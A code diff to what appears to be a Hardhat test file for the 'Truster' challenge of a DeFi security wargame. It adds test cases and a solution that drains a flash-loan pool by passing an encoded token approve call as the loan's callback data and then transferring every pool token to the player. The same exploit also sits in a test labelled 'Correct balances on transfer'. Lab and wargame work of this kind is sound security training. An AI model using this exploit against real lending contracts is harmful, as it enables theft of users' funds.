@@ -20,9 +20,36 @@ describe('[Challenge] Truster', function () {
 
         expect(await token.balanceOf(player.address)).to.equal(0);
     });
-
+        //Test-cases
+    it("Initial player balance", async function () {
+        expect(await token.balanceOf(player.address)).to.equal(0);
+      });
+      it("Pool Balance before/after loans", async function () {
+        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);
+      });
+      it("Checking all the tokens in pool", async function () {
+        expect(await pool.token()).to.eq(token.address);
+      });
+    
+      it("Correct balances on transfer", async function () {
+        let ABI = ["function approve(address to, uint256 amount)"];
+        let iface = new ethers.utils.Interface(ABI);
+        const data = iface.encodeFunctionData("approve", [
+          player.address,
+          TOKENS_IN_POOL,
+        ]);
+        await pool.flashLoan(0, player.address, token.address, data);
+        await token
+          .connect(player)
+          .transferFrom(pool.address, player.address, TOKENS_IN_POOL);
+      });
+    
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let interface = new ethers.utils.Interface(["function approve(address spender,uint256 amount)"]);
+        let data=interface.encodeFunctionData("approve",[player.address , TOKENS_IN_POOL]);
+        await pool.connect(player).flashLoan(0,player.address, token.address  , data );
+       await token.connect(player).transferFrom(pool.address,player.address,TOKENS_IN_POOL);
     });
 
     after(async function () {
